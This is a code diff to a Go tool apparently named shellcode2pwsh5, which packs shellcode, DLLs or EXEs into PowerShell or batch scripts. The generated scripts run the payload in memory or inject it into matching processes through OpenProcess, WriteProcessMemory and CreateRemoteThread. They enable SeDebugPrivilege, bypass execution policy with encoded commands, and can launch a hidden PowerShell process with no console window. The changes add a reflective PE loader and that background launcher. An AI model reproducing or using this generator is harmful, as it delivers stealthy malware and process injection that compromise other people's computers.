@@ -4,7 +4,7 @@
 // decodes it in memory and executes it with a RW -> RX protection scheme.
 // Runtime target: Windows PowerShell 5.1 (powershell.exe).
 //
-// Two execution modes are supported:
+// Shellcode supports two execution modes:
 //
 //	local   (default)  the payload runs inside the PowerShell process itself:
 //	                   VirtualAlloc -> copy -> VirtualProtect(RX) -> CreateThread.
@@ -15,6 +15,8 @@
 //	                   OpenProcess -> VirtualAllocEx -> WriteProcessMemory ->
 //	                   VirtualProtectEx(RX) -> CreateRemoteThread.
 //
+// Native DLLs and EXEs use the embedded reflective PE loader.
+//
 // Layout of a generated .bat/.cmd file:
 //
 //	[5 cmd lines]       launch powershell.exe with a base64-encoded loader
@@ -24,13 +26,10 @@
 //
 // A generated .ps1 file is just the PowerShell core (no cmd wrapper).
 //
-// With --hidden the cmd header passes -WindowStyle Hidden to powershell.exe
-// (which hides the shared console before the core even starts) and the core
-// additionally hides its own console window right before executing the
-// payload, so a .ps1 launched from a visible terminal is covered too.
+// With --hidden a launcher starts a separate Windows PowerShell process
+// without a console window and returns as soon as it starts.
 //
-// The templates are embedded in this file as raw string constants, so the
-// compiled binary is fully standalone. No third-party dependencies.
+// The templates are embedded in the binary, so it can run standalone.
 package main
 
 import (
@@ -71,7 +70,7 @@ var archInfo = map[string]archSpec{
 // coreTpl is the PowerShell core for local execution: metadata variables,
 // integrity check and the RW -> RX in-memory runner. Placeholders are
 // replaced by the generator.
-const coreTpl = `@MARKER@
+const localPrelude = `@MARKER@
 @META@
 $ErrorActionPreference = 'Stop'
 if ([Environment]::Is64BitProcess -ne @ARCH64@) {
@@ -88,7 +87,9 @@ try {
     exit 2
 }
 @VERIFY@
-try {
+`
+
+const coreTpl = localPrelude + `try {
     Add-Type -TypeDefinition @'
 using System;
 using System.Runtime.InteropServices;
@@ -99,13 +100,13 @@ public static class B2P
     [DllImport("kernel32", SetLastError = true)] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
     [DllImport("kernel32", SetLastError = true)] public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
     [DllImport("kernel32", SetLastError = true)] public static extern bool GetExitCodeThread(IntPtr hThread, out uint lpExitCode);
-@CONSOLE_PINVOKE@}
+}
 '@
 } catch {
     [Console]::Error.WriteLine('B2P: Add-Type failed (requires .NET Framework): ' + $_.Exception.Message)
     exit 4
 }
-@HIDE@$size = [UIntPtr]::new([uint32]$sc.Length)
+$size = [UIntPtr]::new([uint32]$sc.Length)
 $addr = [B2P]::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x04)
 if ($addr -eq [IntPtr]::Zero) {
     [Console]::Error.WriteLine('B2P: VirtualAlloc failed (win32 error ' + [Runtime.InteropServices.Marshal]::GetLastWin32Error() + ')')
@@ -181,7 +182,7 @@ public static class B2PI
     [Console]::Error.WriteLine('B2P: Add-Type failed (requires .NET Framework): ' + $_.Exception.Message)
     exit 4
 }
-@HIDE@function B2PI-EnableDebugPrivilege {
+function B2PI-EnableDebugPrivilege {
     try {
         $hToken = [IntPtr]::Zero
         if (-not [B2PI]::OpenProcessToken([B2PI]::GetCurrentProcess(), 0x28, [ref]$hToken)) { return $false }
@@ -202,15 +203,7 @@ public static class B2PI
         return $false
     }
 }
-function B2PI-MatchTarget([string]$pattern, [string]$imageName) {
-    $p = $pattern
-    if ($p.EndsWith('.exe', [StringComparison]::OrdinalIgnoreCase)) { $p = $p.Substring(0, $p.Length - 4) }
-    $n = $imageName
-    if ($n.EndsWith('.exe', [StringComparison]::OrdinalIgnoreCase)) { $n = $n.Substring(0, $n.Length - 4) }
-    if ([string]::IsNullOrEmpty($p) -or [string]::IsNullOrEmpty($n)) { return $false }
-    return ($n.IndexOf($p, [StringComparison]::OrdinalIgnoreCase) -ge 0)
-}
-$os64 = [Environment]::Is64BitOperatingSystem
+` + matchTarget + `$os64 = [Environment]::Is64BitOperatingSystem
 $injector64 = [Environment]::Is64BitProcess
 $payload64 = ($B2P_ARCH -eq 'x64')
 [void](B2PI-EnableDebugPrivilege)
@@ -221,7 +214,19 @@ try {
 } catch {
     $targets = @()
 }
-if ($targets.Count -eq 0) {
+` + injectTargetsTpl
+
+const matchTarget = `function B2PI-MatchTarget([string]$pattern, [string]$imageName) {
+    $p = $pattern
+    if ($p.EndsWith('.exe', [StringComparison]::OrdinalIgnoreCase)) { $p = $p.Substring(0, $p.Length - 4) }
+    $n = $imageName
+    if ($n.EndsWith('.exe', [StringComparison]::OrdinalIgnoreCase)) { $n = $n.Substring(0, $n.Length - 4) }
+    if ([string]::IsNullOrEmpty($p) -or [string]::IsNullOrEmpty($n)) { return $false }
+    return ($n.IndexOf($p, [StringComparison]::OrdinalIgnoreCase) -ge 0)
+}
+`
+
+const injectTargetsTpl = `if ($targets.Count -eq 0) {
     [Console]::Error.WriteLine('B2P: no process matching "' + $B2P_TARGET + '" was found')
     exit 5
 }
@@ -299,7 +304,7 @@ setlocal
 set "B2P_SELF=%~f0"
 set "B2P_PS=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
 @X86FALLBACK@
-"%B2P_PS%" -NoProfile -ExecutionPolicy Bypass@WINDOWSTYLE@ -EncodedCommand @ENC@
+"%B2P_PS%" -NoProfile -ExecutionPolicy Bypass -EncodedCommand @ENC@
 exit /b %ERRORLEVEL%
 `
 
@@ -313,19 +318,20 @@ func usage() {
 	fmt.Fprintf(out, "%s %s - pack a binary payload into a self-contained Windows script (.ps1/.bat/.cmd)\n", progName, version)
 	fmt.Fprint(out, `
 Usage:
-  shellcode2pwsh5 -i <payload.bin> -f <ps1|bat|cmd> [options]
+  shellcode2pwsh5 -i <payload> -f <ps1|bat|cmd> [options]
 
 Options:
   -i, --input  <path>   input binary file (required)
   -f, --format <fmt>    output format: ps1 | bat | cmd (required)
   -o, --output <path>   output file or directory (default: .\input.<fmt>)
-  -t, --type   <type>   payload type (default "shellcode")
-  -a, --arch   <arch>   target architecture: x64 | x86 (default "x64")
-  -p, --process <name>  inject into processes whose image name matches <name>
-      --timeout <ms>    max wait for the payload thread (0 = wait forever)
-      --detach          do not wait for the payload thread at all
+  -t, --type   <type>   shellcode | dll | exe (default: detect from file contents)
+      --exe-arg=<arg>   append one EXE argument (repeatable, in order)
+  -a, --arch   <arch>   x64 | x86 (PE: auto-detected, shellcode: default x64)
+  -p, --process <name>  inject shellcode or DLL into matching processes
+      --timeout <ms>    shellcode thread wait limit (0 = wait forever)
+      --detach          skip the shellcode thread wait
       --verify          run a SHA-256 integrity self-check before execution
-      --hidden          hide the console window while the payload runs
+      --hidden          start PowerShell in the background without a console window
       --force           overwrite an existing output file
       --version         print version and exit
   -h, --help            show this help
@@ -338,23 +344,27 @@ Target matching (--process):
     -p xplorer   matches explorer.exe and 3xplorer.exe but not plorer.exe
     -p explorer  matches windows_explorer.exe but not xplorer.exe
   Only one --process pattern may be given. Without --process the payload runs
-  inside the PowerShell process that executes the script.
+  inside the PowerShell process that executes the script. EXE rejects --process.
+
+PE notes:
+  Without --type, a PE header selects DLL or EXE. Other inputs use shellcode.
+  DLL mode calls the case-sensitive void VoidFunc() export. Remote DLL mode
+  returns after launching the export. Local PE loading is synchronous.
 
 Remote injection notes:
   The payload must match the bitness of the target process; a 32-bit payload
   cannot run in a 64-bit process and vice versa. A 32-bit PowerShell cannot
-  inject into a 64-bit process at all. Targets that need elevated rights are
-  reached through SeDebugPrivilege, which the script enables when possible.
+  inject into a 64-bit process at all. DLL mode requires PowerShell and the
+  target process to match the DLL's bitness. The shellcode runner enables
+  SeDebugPrivilege when possible.
 
 Notes on --hidden:
-  For .bat/.cmd the window disappears as soon as powershell.exe starts. For .ps1
-  the core hides its own console right before the payload runs. Console error
-  messages (exit codes 2-7) are then not visible, so use --hidden only for
-  unattended runs. If you start a .ps1 from your own terminal, that terminal
-  window is hidden too, because the script inherits its console.
+  The launcher returns after creating the background process. Its exit code
+  reports launch success or failure. Payload output and exit codes are not
+  sent back to the calling terminal.
 
-Generated script exit codes: payload exit code passes through when the
-payload thread was allowed to finish; container errors: 2 = payload data or
+Generated script exit codes: shellcode exit code passes through when its
+thread was allowed to finish; container errors: 2 = payload data or
 marker damaged, 3 = architecture mismatch, 4 = memory API failure,
 5 = no matching target process, 6 = target process could not be opened,
 7 = timed out waiting for the payload thread.
@@ -372,14 +382,42 @@ func buildLoader() string {
 		"iex $t.Substring($i)"
 }
 
-// encodeLoader encodes the loader for -EncodedCommand: base64 of UTF-16LE.
-func encodeLoader() string {
-	units := utf16.Encode([]rune(buildLoader()))
+// encodeCommand encodes a PowerShell command for -EncodedCommand.
+func encodeCommand(command string) string {
+	units := utf16.Encode([]rune(command))
 	buf := make([]byte, 0, len(units)*2)
 	for _, u := range units {
 		buf = append(buf, byte(u), byte(u>>8))
 	}
 	return base64.StdEncoding.EncodeToString(buf)
+}
+
+// The child reads the core from disk. Only the loader is passed on the command
+// line, and the path is passed through the child's environment.
+func buildBackgroundLauncher(arch, scriptPath string) string {
+	systemDir := `if ([Environment]::Is64BitOperatingSystem) { $systemDir = 'SysWOW64' }`
+	if archInfo[arch].is64 {
+		systemDir = `if ([Environment]::Is64BitOperatingSystem -and -not [Environment]::Is64BitProcess) { $systemDir = 'Sysnative' }`
+	}
+	return fmt.Sprintf(`try {
+    $scriptPath = %s
+    if (-not $scriptPath) { throw 'Script path is unavailable' }
+    $systemDir = 'System32'
+    %s
+    $start = New-Object System.Diagnostics.ProcessStartInfo
+    $start.FileName = [IO.Path]::Combine($env:SystemRoot, $systemDir, 'WindowsPowerShell\v1.0\powershell.exe')
+    $start.Arguments = '-NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand %s'
+    $start.UseShellExecute = $false
+    $start.CreateNoWindow = $true
+    $start.EnvironmentVariables['B2P_SELF'] = $scriptPath
+    $child = [Diagnostics.Process]::Start($start)
+    $child.Dispose()
+} catch {
+    [Console]::Error.WriteLine('B2P: could not start background PowerShell: ' + $_.Exception.Message)
+    exit 4
+}
+exit 0
+`, scriptPath, systemDir, encodeCommand(buildLoader()))
 }
 
 func wrapB64(data []byte) string {
@@ -453,38 +491,17 @@ func waitBlockRemote(timeoutMs int, detach bool) string {
 }
 
 // buildCore returns the PowerShell core for local execution.
-func buildCore(payloadType, arch string, payload []byte, sha string, verify, hidden bool, timeoutMs int, detach bool) (string, error) {
+func buildCore(payloadType, arch string, payload []byte, sha string, verify bool, timeoutMs int, detach bool) (string, error) {
 	info := archInfo[arch]
 	meta := fmt.Sprintf("$B2P_TYPE='%s';$B2P_ARCH='%s';$B2P_SIZE=%d\n$B2P_SHA256='%s'",
 		payloadType, arch, len(payload), sha)
 
 	text := coreTpl
 	if verify {
-		verifyBlock := "if ($sc.Length -ne $B2P_SIZE) { [Console]::Error.WriteLine('B2P: integrity check failed (size mismatch)'); exit 2 }\n" +
-			"$hs = [BitConverter]::ToString([System.Security.Cryptography.SHA256]::Create().ComputeHash($sc)).Replace('-','').ToLowerInvariant()\n" +
-			"if ($hs -ne $B2P_SHA256) { [Console]::Error.WriteLine('B2P: integrity check failed (sha256 mismatch - file modified?)'); exit 2 }"
-		text = strings.Replace(text, "@VERIFY@\n", verifyBlock+"\n", 1)
+		text = strings.Replace(text, "@VERIFY@\n", verifyPayload+"\n", 1)
 	} else {
 		text = strings.Replace(text, "@VERIFY@\n", "", 1)
 	}
-
-	// Console-window P/Invokes, only emitted when the window must be hidden.
-	// Note: GetConsoleWindow lives in kernel32, ShowWindow in user32.
-	consolePinvoke := ""
-	if hidden {
-		consolePinvoke = "    [DllImport(\"kernel32\", SetLastError = true)] public static extern IntPtr GetConsoleWindow();\n" +
-			"    [DllImport(\"user32\", SetLastError = true)] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n"
-	}
-	text = strings.Replace(text, "@CONSOLE_PINVOKE@", consolePinvoke, 1)
-
-	// Hide the console just before running the payload, so that integrity and
-	// architecture errors stay visible on screen.
-	hideBlock := ""
-	if hidden {
-		hideBlock = "$hWnd = [B2P]::GetConsoleWindow()\n" +
-			"if ($hWnd -ne [IntPtr]::Zero) { [void][B2P]::ShowWindow($hWnd, 0) }\n"
-	}
-	text = strings.Replace(text, "@HIDE@", hideBlock, 1)
 
 	arch64 := "$false"
 	if info.is64 {
@@ -507,43 +524,24 @@ func buildCore(payloadType, arch string, payload []byte, sha string, verify, hid
 			return "", fmt.Errorf("internal error: template placeholder %s was not replaced", kv[0])
 		}
 	}
-	for _, ph := range []string{"@VERIFY@", "@HIDE@", "@CONSOLE_PINVOKE@"} {
-		if strings.Contains(text, ph) {
-			return "", fmt.Errorf("internal error: template placeholder %s was not replaced", ph)
-		}
-	}
 	return text, nil
 }
 
+const verifyPayload = `if ($sc.Length -ne $B2P_SIZE) { [Console]::Error.WriteLine('B2P: integrity check failed (size mismatch)'); exit 2 }
+$hs = [BitConverter]::ToString([System.Security.Cryptography.SHA256]::Create().ComputeHash($sc)).Replace('-','').ToLowerInvariant()
+if ($hs -ne $B2P_SHA256) { [Console]::Error.WriteLine('B2P: integrity check failed (sha256 mismatch - file modified?)'); exit 2 }`
+
 // buildInjectCore returns the PowerShell core for remote execution.
-func buildInjectCore(payloadType, arch string, payload []byte, sha string, verify, hidden bool, target string, timeoutMs int, detach bool) (string, error) {
+func buildInjectCore(payloadType, arch string, payload []byte, sha string, verify bool, target string, timeoutMs int, detach bool) (string, error) {
 	meta := fmt.Sprintf("$B2P_TYPE='%s';$B2P_ARCH='%s';$B2P_SIZE=%d\n$B2P_SHA256='%s'",
 		payloadType, arch, len(payload), sha)
 
 	text := injectCoreTpl
 	if verify {
-		verifyBlock := "if ($sc.Length -ne $B2P_SIZE) { [Console]::Error.WriteLine('B2P: integrity check failed (size mismatch)'); exit 2 }\n" +
-			"$hs = [BitConverter]::ToString([System.Security.Cryptography.SHA256]::Create().ComputeHash($sc)).Replace('-','').ToLowerInvariant()\n" +
-			"if ($hs -ne $B2P_SHA256) { [Console]::Error.WriteLine('B2P: integrity check failed (sha256 mismatch - file modified?)'); exit 2 }"
-		text = strings.Replace(text, "@VERIFY@\n", verifyBlock+"\n", 1)
+		text = strings.Replace(text, "@VERIFY@\n", verifyPayload+"\n", 1)
 	} else {
 		text = strings.Replace(text, "@VERIFY@\n", "", 1)
 	}
-
-	// Console-window P/Invokes, only emitted when the window must be hidden.
-	consolePinvoke := ""
-	if hidden {
-		consolePinvoke = "    [DllImport(\"kernel32\", SetLastError = true)] public static extern IntPtr GetConsoleWindow();\n" +
-			"    [DllImport(\"user32\", SetLastError = true)] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n"
-	}
-	text = strings.Replace(text, "@CONSOLE_PINVOKE@", consolePinvoke, 1)
-
-	hideBlock := ""
-	if hidden {
-		hideBlock = "$hWnd = [B2PI]::GetConsoleWindow()\n" +
-			"if ($hWnd -ne [IntPtr]::Zero) { [void][B2PI]::ShowWindow($hWnd, 0) }\n"
-	}
-	text = strings.Replace(text, "@HIDE@", hideBlock, 1)
 
 	replacements := [][2]string{
 		{"@MARKER@", marker},
@@ -560,30 +558,17 @@ func buildInjectCore(payloadType, arch string, payload []byte, sha string, verif
 			return "", fmt.Errorf("internal error: template placeholder %s was not replaced", kv[0])
 		}
 	}
-	for _, ph := range []string{"@VERIFY@", "@HIDE@", "@CONSOLE_PINVOKE@"} {
-		if strings.Contains(text, ph) {
-			return "", fmt.Errorf("internal error: template placeholder %s was not replaced", ph)
-		}
-	}
 	return text, nil
 }
 
-func buildHead(arch, enc string, hidden bool) (string, error) {
+func buildHead(arch, enc string) (string, error) {
 	fallback := ""
 	if !archInfo[arch].is64 {
 		fallback = `if exist "%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" set "B2P_PS=%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"`
 	}
 	text := strings.ReplaceAll(headTpl, "@X86FALLBACK@", fallback)
 	text = strings.ReplaceAll(text, "@ENC@", enc)
-	// -WindowStyle Hidden hides the console that powershell.exe shares with the
-	// cmd wrapper, i.e. the window the user would otherwise see.
-	windowStyle := ""
-	if hidden {
-		windowStyle = " -WindowStyle Hidden"
-	}
-	text = strings.ReplaceAll(text, "@WINDOWSTYLE@", windowStyle)
-	if strings.Contains(text, "@X86FALLBACK@") || strings.Contains(text, "@ENC@") ||
-		strings.Contains(text, "@WINDOWSTYLE@") {
+	if strings.Contains(text, "@X86FALLBACK@") || strings.Contains(text, "@ENC@") {
 		return "", fmt.Errorf("internal error: head template placeholders were not replaced")
 	}
 	return text, nil
@@ -597,6 +582,7 @@ func writeScript(path, text string) error {
 			return fmt.Errorf("output contains a non-ASCII byte at offset %d; templates must stay pure ASCII", i)
 		}
 	}
+	text = strings.ReplaceAll(text, "\r\n", "\n")
 	data := []byte(strings.ReplaceAll(text, "\n", "\r\n"))
 	tmp := path + ".tmp"
 	if err := os.WriteFile(tmp, data, 0o644); err != nil {
@@ -683,7 +669,6 @@ func main() {
 	flag.Usage = usage
 
 	var (
-		input       string
 		format      string
 		output      string
 		payloadType string
@@ -695,15 +680,23 @@ func main() {
 		force       bool
 		showVersion bool
 	)
-	targetFlag := &singleFlag{}
-	flag.StringVar(&input, "i", "", "input binary file")
-	flag.StringVar(&input, "input", "", "input binary file")
+	inputFlag, targetFlag := &singleFlag{}, &singleFlag{}
+	var exeArgs []string
+	flag.Func("exe-arg", "append one EXE argument (repeatable)", func(arg string) error {
+		if strings.IndexByte(arg, 0) >= 0 {
+			return fmt.Errorf("EXE arguments cannot contain NUL bytes")
+		}
+		exeArgs = append(exeArgs, arg)
+		return nil
+	})
+	flag.Var(inputFlag, "i", "input binary file")
+	flag.Var(inputFlag, "input", "input binary file")
 	flag.StringVar(&format, "f", "", "output format: ps1 | bat | cmd")
 	flag.StringVar(&format, "format", "", "output format: ps1 | bat | cmd")
 	flag.StringVar(&output, "o", "", "output file or directory")
 	flag.StringVar(&output, "output", "", "output file or directory")
-	flag.StringVar(&payloadType, "t", "shellcode", "payload type")
-	flag.StringVar(&payloadType, "type", "shellcode", "payload type")
+	flag.StringVar(&payloadType, "t", "", "payload type (default: auto-detect)")
+	flag.StringVar(&payloadType, "type", "", "payload type (default: auto-detect)")
 	flag.StringVar(&arch, "a", "x64", "target architecture: x64 | x86")
 	flag.StringVar(&arch, "arch", "x64", "target architecture: x64 | x86")
 	flag.Var(targetFlag, "p", "target process name pattern (injects into matching processes)")
@@ -711,7 +704,7 @@ func main() {
 	flag.IntVar(&timeoutMs, "timeout", 0, "max wait in milliseconds for the payload thread (0 = wait forever)")
 	flag.BoolVar(&detach, "detach", false, "do not wait for the payload thread")
 	flag.BoolVar(&verify, "verify", false, "run a SHA-256 integrity self-check before execution")
-	flag.BoolVar(&hidden, "hidden", false, "hide the console window while the payload runs")
+	flag.BoolVar(&hidden, "hidden", false, "start PowerShell in the background without a console window")
 	flag.BoolVar(&force, "force", false, "overwrite an existing output file")
 	flag.BoolVar(&showVersion, "version", false, "print version and exit")
 	flag.Parse()
@@ -721,6 +714,10 @@ func main() {
 		return
 	}
 
+	if flag.NArg() != 0 {
+		die("unexpected positional arguments (see -h for usage)", 1)
+	}
+	input := inputFlag.value
 	if input == "" {
 		die("missing required option -i/--input (see -h for usage)", 1)
 	}
@@ -731,14 +728,25 @@ func main() {
 	payloadType = strings.ToLower(payloadType)
 	arch = strings.ToLower(arch)
 	target := strings.TrimSpace(targetFlag.value)
+	archSet, waitSet, typeSet := false, false, false
+	flag.Visit(func(f *flag.Flag) {
+		switch f.Name {
+		case "a", "arch":
+			archSet = true
+		case "timeout", "detach":
+			waitSet = true
+		case "t", "type":
+			typeSet = true
+		}
+	})
 
 	switch format {
 	case "ps1", "bat", "cmd":
 	default:
 		die(fmt.Sprintf("unknown format %q, expected ps1, bat or cmd", format), 1)
 	}
-	if payloadType != "shellcode" {
-		die(fmt.Sprintf("type %q is not implemented yet (v1 supports shellcode only; dotnet/pe are planned)", payloadType), 1)
+	if typeSet && payloadType != "shellcode" && payloadType != "dll" && payloadType != "exe" {
+		die(fmt.Sprintf("unknown payload type %q, expected shellcode, dll or exe", payloadType), 1)
 	}
 	if _, ok := archInfo[arch]; !ok {
 		die(fmt.Sprintf("unknown architecture %q, expected x64 or x86", arch), 1)
@@ -763,6 +771,36 @@ func main() {
 	if len(payload) == 0 {
 		die("input file is empty: "+input, 1)
 	}
+	isPE := hasPESignature(payload)
+	if !typeSet && !isPE {
+		payloadType = "shellcode"
+	}
+	if payloadType != "shellcode" {
+		if !isPE {
+			die("expected a Windows PE image", 1)
+		}
+		peType, peArch, err := inspectPE(payload)
+		if err != nil {
+			die(err.Error(), 1)
+		}
+		if typeSet && payloadType != peType {
+			die(fmt.Sprintf("PE image does not match --type %s (detected %s)", payloadType, peType), 1)
+		}
+		payloadType = peType
+		if archSet && arch != peArch {
+			die(fmt.Sprintf("--arch %s does not match PE architecture %s", arch, peArch), 1)
+		}
+		arch = peArch
+	}
+	if payloadType == "exe" && targetFlag.seen {
+		die("--process is only supported for shellcode and DLL payloads", 1)
+	}
+	if payloadType != "exe" && len(exeArgs) != 0 {
+		die("--exe-arg is only supported for EXE payloads", 1)
+	}
+	if payloadType != "shellcode" && waitSet {
+		die("--timeout and --detach are only supported for shellcode", 1)
+	}
 	if len(payload) > largeWarn {
 		fmt.Fprintf(os.Stderr, "%s: warning: payload is %.1f MB; scripts larger than 50 MB become slow to parse and run\n",
 			progName, float64(len(payload))/(1024*1024))
@@ -779,22 +817,30 @@ func main() {
 	sha := hex.EncodeToString(sum[:])
 
 	var core string
-	if target != "" {
-		core, err = buildInjectCore(payloadType, arch, payload, sha, verify, hidden,
+	if payloadType != "shellcode" {
+		core = buildPECore(payloadType, arch, payload, sha, verify, target, exeArgs)
+	} else if target != "" {
+		core, err = buildInjectCore(payloadType, arch, payload, sha, verify,
 			escapePSLiteral(target), timeoutMs, detach)
 	} else {
-		core, err = buildCore(payloadType, arch, payload, sha, verify, hidden, timeoutMs, detach)
+		core, err = buildCore(payloadType, arch, payload, sha, verify, timeoutMs, detach)
 	}
 	if err != nil {
 		die(err.Error(), 1)
 	}
 	text := core
 	if format != "ps1" {
-		head, err := buildHead(arch, encodeLoader(), hidden)
+		command := buildLoader()
+		if hidden {
+			command = buildBackgroundLauncher(arch, "$env:B2P_SELF")
+		}
+		head, err := buildHead(arch, encodeCommand(command))
 		if err != nil {
 			die(err.Error(), 1)
 		}
 		text = head + core
+	} else if hidden {
+		text = buildBackgroundLauncher(arch, "$PSCommandPath") + core
 	}
 
 	if err := os.MkdirAll(filepath.Dir(outPath), 0o755); err != nil {
@@ -820,14 +866,16 @@ func main() {
 	fmt.Printf("  format : %s   type: %s   arch: %s\n", format, payloadType, arch)
 	fmt.Printf("  payload: %d bytes   sha256 %s\n", len(payload), sha)
 	fmt.Printf("  output : %d bytes   verify: %s   hidden: %s\n", outSize, verifyState, hiddenState)
-	if target != "" {
+	if target != "" && payloadType == "dll" {
+		fmt.Printf("  mode   : remote DLL   target: %s\n", target)
+	} else if target != "" {
 		fmt.Printf("  mode   : remote   target: %s   timeout: %s   detach: %v\n",
 			target, timeoutText(timeoutMs), detach)
 		fmt.Printf("  note   : the payload bitness must match the target process bitness\n")
 	} else {
-		fmt.Printf("  mode   : local    (the payload runs inside this PowerShell process)\n")
+		fmt.Printf("  mode   : local    (the payload runs inside the PowerShell runner)\n")
 	}
 	if hidden {
-		fmt.Printf("  note   : console window is hidden while the payload runs; container errors (2-7) will not be visible\n")
+		fmt.Printf("  note   : launcher returns after starting a separate PowerShell process without a console window\n")
 	}
 }
